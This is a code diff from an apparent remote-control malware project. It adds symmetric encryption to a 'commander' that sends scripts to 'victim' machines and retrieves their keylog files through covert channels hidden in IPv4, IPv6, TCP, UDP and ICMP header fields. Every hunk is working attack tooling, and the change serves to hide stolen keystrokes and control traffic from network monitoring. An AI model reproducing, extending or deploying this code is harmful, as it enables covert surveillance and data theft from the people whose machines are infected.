@@ -353,7 +353,7 @@ def __bytes_to_bin(data):
 # // ===================================== COVERT CHANNEL FUNCTIONS ===================================== //
 
 # TODO: Encrypt and Decrypt this!
-def __get_target_ipv6_address_helper(sock: socket.socket, dest_ip: str, dest_port: int):
+def __get_target_ipv6_address_helper(sock: socket.socket, dest_ip: str, dest_port: int, shared_secret: bytes):
     # Print operation
     print(constants.GET_IPV6_MSG.format(dest_ip, dest_port))
     print(constants.TRANSFER_FILE_INIT_MSG.format(constants.GET_IPV6_SCRIPT_PATH))
@@ -364,25 +364,24 @@ def __get_target_ipv6_address_helper(sock: socket.socket, dest_ip: str, dest_por
         print(constants.TRANSFER_FILE_INIT_MSG.format(constants.GET_IPV6_SCRIPT_PATH))
 
         # Send file name and commander IPv6 address
-        sock.send((constants.GET_IPV6_SCRIPT_PATH + "/" + determine_ipv6_address()[0]).encode())
+        sock.send(encrypt_string((constants.GET_IPV6_SCRIPT_PATH + "/" + determine_ipv6_address()[0]),
+                                 shared_secret).encode())
         print(constants.FILE_NAME_TRANSFER_MSG.format(constants.GET_IPV6_SCRIPT_PATH))
 
         # Wait for client/victim to buffer
         time.sleep(1)
 
-        # Initiate script transfer
-        with open(constants.GET_IPV6_SCRIPT_PATH, 'rb') as file:
-            while True:
-                file_data = file.read(constants.BYTE_LIMIT)
-                if not file_data:
-                    break
-                sock.send(file_data)
+        # Encrypt File
+        encrypted_file = encrypt_file(constants.GET_IPV6_SCRIPT_PATH, shared_secret)
 
-        # Send end-of-file marker
+        # Send encrypted file data
+        sock.sendall(encrypted_file)
+
+        # Send EOF
         sock.send(constants.END_OF_FILE_SIGNAL)
 
         # Get an ACK from victim for operation success
-        transfer_result = sock.recv(constants.BYTE_LIMIT).decode().split("/")
+        transfer_result = decrypt_string(sock.recv(constants.BYTE_LIMIT).decode(), shared_secret).split("/")
 
         if transfer_result[0] == constants.VICTIM_ACK:
             print(constants.FILE_TRANSFER_SUCCESSFUL.format(constants.GET_IPV6_SCRIPT_PATH, dest_ip, dest_port))
@@ -398,8 +397,7 @@ def __get_target_ipv6_address_helper(sock: socket.socket, dest_ip: str, dest_por
         return None, None
 
 
-# TODO: Encrypt and Decrypt this!
-def __get_target_ipv6_address(sock: socket.socket, dest_ip: str, dest_port: int):
+def __get_target_ipv6_address(sock: socket.socket, dest_ip: str, dest_port: int, shared_secret: bytes):
     """
     Sends a ipv6_getter.py script to target and awaits for
     a response containing the IPv6 address and port number.
@@ -413,11 +411,14 @@ def __get_target_ipv6_address(sock: socket.socket, dest_ip: str, dest_port: int)
     @param dest_port:
             An int containing the target IP port number
 
+    @param shared_secret:
+            The shared key for symmetric encryption/decryption
+
     @return: (IPv6 address, port)
             A tuple containing the IPv6 address and port
             number of the target
     """
-    dest_ip, dest_port = __get_target_ipv6_address_helper(sock, dest_ip, dest_port)
+    dest_ip, dest_port = __get_target_ipv6_address_helper(sock, dest_ip, dest_port, shared_secret)
     if dest_ip is None or dest_port is None:
         print(constants.GET_IPV6_ERROR)
         print(constants.RETURN_MAIN_MENU_MSG)
@@ -518,7 +519,7 @@ def transfer_file_ipv4_version(client_sock: socket.socket, dest_ip: str,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -572,7 +573,7 @@ def transfer_file_ipv4_ihl(client_sock: socket.socket, dest_ip: str,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -621,7 +622,7 @@ def transfer_file_ipv4_ds(client_sock: socket.socket, dest_ip: str,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -671,7 +672,7 @@ def transfer_file_ipv4_ecn(client_sock: socket.socket, dest_ip: str,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -721,7 +722,7 @@ def transfer_file_ipv4_total_length(client_sock: socket.socket, dest_ip: str,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -770,7 +771,7 @@ def transfer_file_ipv4_identification(client_sock: socket.socket, dest_ip: str,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -819,7 +820,7 @@ def transfer_file_ipv4_flags(client_sock: socket.socket, dest_ip: str,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -868,7 +869,7 @@ def transfer_file_ipv4_frag_offset(client_sock: socket.socket, dest_ip: str,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -917,7 +918,7 @@ def transfer_file_ipv4_protocol(client_sock: socket.socket, dest_ip: str,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -966,7 +967,7 @@ def transfer_file_ipv4_header_chksum(client_sock: socket.socket, dest_ip: str,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -1029,7 +1030,7 @@ def transfer_file_ipv4_src_addr(client_sock: socket.socket, client_ip: str,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -1086,7 +1087,7 @@ def transfer_file_ipv4_dst_addr(client_sock: socket.socket, dest_ip: str,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -2762,9 +2763,13 @@ def __bin_to_bytes(binary_string):
     return bytes(int(binary_string[i:i + 8], 2) for i in range(0, len(binary_string), 8))
 
 
-def covert_data_write_to_file(covert_data: str, filename: str):
+def covert_data_write_to_file(shared_key: bytes, covert_data: str, filename: str):
     """
     Creates a file (if does not exist) and writes binary data to the file.
+    In addition, it decrypts the data beforehand.
+
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
 
     @param covert_data:
         A string containing binary data
@@ -2775,15 +2780,17 @@ def covert_data_write_to_file(covert_data: str, filename: str):
     @return: None
     """
     if covert_data:
-        data = (__bin_to_bytes(covert_data)
-                .replace(constants.NULL_BYTE, b'')
-                .replace(constants.STX_BYTE, b''))
+        encrypted_data = (__bin_to_bytes(covert_data)
+                          .replace(constants.NULL_BYTE, b'')
+                          .replace(constants.STX_BYTE, b''))
+
+        decrypted_data = decrypt(encrypted_data, shared_key)
 
         with open(filename, constants.WRITE_BINARY_MODE) as f:
-            f.write(data)
+            f.write(decrypted_data)
 
 
-def get_packet_count(client_socket: socket):
+def get_packet_count(client_socket: socket, shared_secret: bytes):
     """
     Returns the total number of packets from commander for
     accurate Scapy sniff functionality.
@@ -2791,11 +2798,14 @@ def get_packet_count(client_socket: socket):
     @param client_socket:
         The client socket
 
+    @param shared_secret:
+        The shared key for symmetric encryption/decryption
+
     @return: count
         An integer containing the total number of packets
         to be received
     """
-    count = int(client_socket.recv(1024).decode())
+    count = int(decrypt_string(client_socket.recv(1024).decode(), shared_secret))
     print(constants.CLIENT_RESPONSE.format(constants.CLIENT_TOTAL_PACKET_COUNT_MSG.format(count)))
     return count
 
@@ -3889,7 +3899,8 @@ def receive_keylog_file_covert(client_socket: socket.socket,
                                source_port: int,
                                choices: tuple,
                                save_file_path: str,
-                               file_name: str):
+                               file_name: str,
+                               shared_secret: bytes):
     """
     A different version from the regular receive_file_covert(),
     but specifically deals with the receiving of saved keylogged
@@ -3917,6 +3928,9 @@ def receive_keylog_file_covert(client_socket: socket.socket,
     @param file_name:
         A string containing the file name
 
+    @param shared_secret:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
     # CHECK: If destination field choice, do nothing
@@ -3940,7 +3954,7 @@ def receive_keylog_file_covert(client_socket: socket.socket,
     # DIFFERENT SNIFFS: For IPv4 Headers/Field
     if constants.IPV4 in choices:
         # Get total count of packets
-        count = get_packet_count(client_socket)
+        count = get_packet_count(client_socket, shared_secret)
 
         if constants.SOURCE_ADDRESS_FIELD in choices:
             received_packets = sniff(filter="dst host {} and dst port {}"
@@ -3954,13 +3968,13 @@ def receive_keylog_file_covert(client_socket: socket.socket,
         source_ipv6_ip, source_ipv6_port = determine_ipv6_address()
 
         # Transfer ipv6_getter.py file to victim/target and get their IPv6 address
-        victim_ipv6_addr, _ = __get_target_ipv6_address(client_socket, client_ip, client_port)
+        victim_ipv6_addr, _ = __get_target_ipv6_address(client_socket, client_ip, client_port, shared_secret)
 
         # Send own IPv6 address and port
-        client_socket.send((source_ipv6_ip + "/" + str(source_ipv6_port)).encode())
+        client_socket.send(encrypt_string((source_ipv6_ip + "/" + str(source_ipv6_port)), shared_secret).encode())
 
         # Get total count of packets
-        count = get_packet_count(client_socket)
+        count = get_packet_count(client_socket, shared_secret)
 
         if constants.NEXT_HEADER in choices:
             received_packets = sniff(filter="src host {} and dst host {}"
@@ -3973,7 +3987,7 @@ def receive_keylog_file_covert(client_socket: socket.socket,
 
     # DIFFERENT SNIFFS: For TCP Headers/Field
     if constants.TCP in choices:
-        count = get_packet_count(client_socket)
+        count = get_packet_count(client_socket, shared_secret)
 
         if constants.SOURCE_PORT_FIELD in choices:
             received_packets = sniff(filter="tcp and dst host {} and dst port {} and "
@@ -3999,7 +4013,7 @@ def receive_keylog_file_covert(client_socket: socket.socket,
 
     # DIFFERENT SNIFFS: For UDP Headers/Field
     if constants.UDP in choices:
-        count = get_packet_count(client_socket)
+        count = get_packet_count(client_socket, shared_secret)
 
         if constants.DESTINATION_PORT_FIELD in choices:
             received_packets = sniff(filter="udp and dst host {} and src host {}"
@@ -4012,7 +4026,7 @@ def receive_keylog_file_covert(client_socket: socket.socket,
 
     # DIFFERENT SNIFFS: For ICMP Header/Fields
     if constants.ICMP in choices:
-        count = get_packet_count(client_socket)
+        count = get_packet_count(client_socket, shared_secret)
 
         received_packets = sniff(filter="icmp and dst host {} and src host {}"
                                  .format(source_ip, client_ip),
@@ -4023,17 +4037,17 @@ def receive_keylog_file_covert(client_socket: socket.socket,
                              for packet in received_packets if packet_callback(packet))
 
     # Write Data to File
-    covert_data_write_to_file(extracted_data, save_file_path)
+    covert_data_write_to_file(shared_secret, extracted_data, save_file_path)
 
     # Send ACK to victim (if good)
     if is_file_openable(save_file_path):
         print(constants.TRANSFER_SUCCESS_MSG.format(file_name))
-        client_socket.send(constants.VICTIM_ACK.encode())
+        client_socket.send(encrypt_string(constants.VICTIM_ACK, shared_secret).encode())
         print(constants.RETURN_MAIN_MENU_MSG)
         print(constants.MENU_CLOSING_BANNER)
         return None
     else:
-        client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
+        client_socket.send(encrypt_string(constants.FILE_CANNOT_OPEN_TO_SENDER, shared_secret).encode())
         print(constants.RETURN_MAIN_MENU_MSG)
         print(constants.MENU_CLOSING_BANNER)
         return None
@@ -4086,35 +4100,39 @@ def is_watching(status: bool, client_ip: str, client_port: int, error_msg: str):
 
 def __receive_keylog_files(client_socket: socket.socket, dest_ip: str, dest_port: int,
                            source_ip: str, source_port: int, choices: tuple,
-                           sub_directory_path: str, number_of_files: int):
+                           sub_directory_path: str, number_of_files: int,
+                           shared_secret: bytes):
     """
     Receives any recorded keylog .txt files from the client/victim
 
-    :param client_socket:
+    @param client_socket:
             The client socket
 
-    :param number_of_files:
+    @param number_of_files:
             An integer representing the number of .txt files on client/victim side
 
-    :param sub_directory_path:
+    @param sub_directory_path:
             A string containing the "/download/[IP_address]" path
+
+    @param shared_secret:
+            The shared key for symmetric encryption/decryption
 
     :return: None
     """
-
     for i in range(int(number_of_files)):
         # Get file name
-        file_name = client_socket.recv(constants.BYTE_LIMIT).decode()
+        file_name = decrypt_string(client_socket.recv(constants.BYTE_LIMIT).decode(), shared_secret)
         print(constants.RECEIVING_FILE_MSG.format(file_name))
 
         # Send choice (header/field) for covert channel
-        client_socket.send((choices[0] + "/" + choices[1]).encode())
+        client_socket.send(encrypt_string((choices[0] + "/" + choices[1]), shared_secret).encode())
 
         # Create a new file path under downloads/client_ip/____.txt
         file_path = os.path.join(sub_directory_path, file_name)
 
         receive_keylog_file_covert(client_socket, dest_ip, dest_port, source_ip,
-                                   source_port, choices, file_path, file_name)
+                                   source_port, choices, file_path, file_name,
+                                   shared_secret)
 
 
 def find_specific_client_socket(client_dict: dict,
@@ -4406,7 +4424,7 @@ def __make_main_and_sub_directories(client_ip: str):
     return sub_directory_path
 
 
-def perform_menu_item_4(client_dict: dict, source_ip: str, source_port: int):
+def perform_menu_item_4(client_dict: dict, source_ip: str, source_port: int, shared_secret: bytes):
     # CASE 1: Check if client list is empty
     if len(client_dict) == constants.ZERO:
         print(constants.GET_KEYLOG_FILE_NO_CLIENTS_ERROR)
@@ -4426,7 +4444,8 @@ def perform_menu_item_4(client_dict: dict, source_ip: str, source_port: int):
             return None
         else:
             choices = protocol_and_field_selector()
-            __perform_menu_item_4_helper(client_socket, client_ip, client_port, source_ip, source_port, choices)
+            __perform_menu_item_4_helper(client_socket, client_ip, client_port, source_ip,
+                                         source_port, shared_secret, choices)
 
     # CASE 3: Handle a specific client/victim (or if multiple clients)
     elif len(client_dict) != constants.ZERO:
@@ -4443,22 +4462,23 @@ def perform_menu_item_4(client_dict: dict, source_ip: str, source_port: int):
                 return None
             else:
                 choices = protocol_and_field_selector()
-                __perform_menu_item_4_helper(target_socket, target_ip, target_port, source_ip, source_port, choices)
+                __perform_menu_item_4_helper(target_socket, target_ip, target_port, source_ip,
+                                             source_port, shared_secret, choices)
         else:
             print(constants.TARGET_VICTIM_NOT_FOUND)
 
 
 def __perform_menu_item_4_helper(client_socket: socket.socket, client_ip: str,
                                  client_port: int, source_ip: str, source_port: int,
-                                 choices: tuple):
+                                 shared_secret: bytes, choices: tuple):
 
     # Send to victim a notification that it is wanting to receive keylog files
     print(constants.SEND_GET_KEYLOG_SIGNAL_PROMPT)
-    client_socket.send(constants.TRANSFER_KEYLOG_FILE_SIGNAL.encode())
+    client_socket.send(encrypt_string(constants.TRANSFER_KEYLOG_FILE_SIGNAL, shared_secret).encode())
 
     # Await response if there are any .txt files to transfer
     print(constants.GET_KEYLOG_PROCESS_MSG.format(client_ip, client_port))
-    response = client_socket.recv(constants.BYTE_LIMIT).decode().split('/')
+    response = decrypt_string(client_socket.recv(constants.BYTE_LIMIT).decode(), shared_secret).split('/')
     response_status = response[0]
     response_msg = response[1]
     number_of_files = response[2]
@@ -4469,11 +4489,11 @@ def __perform_menu_item_4_helper(client_socket: socket.socket, client_ip: str,
         sub_directory_path = __make_main_and_sub_directories(client_ip)
 
         # Send commander port number to target/victim
-        client_socket.send((str(source_port)).encode())
+        client_socket.send(encrypt_string((str(source_port)), shared_secret).encode())
 
         # GET files from target to commander
         __receive_keylog_files(client_socket, client_ip, client_port, source_ip, source_port,
-                               choices, sub_directory_path, int(number_of_files))
+                               choices, sub_directory_path, int(number_of_files), shared_secret)
 
         print(constants.RETURN_MAIN_MENU_MSG)
         print(constants.MENU_CLOSING_BANNER)
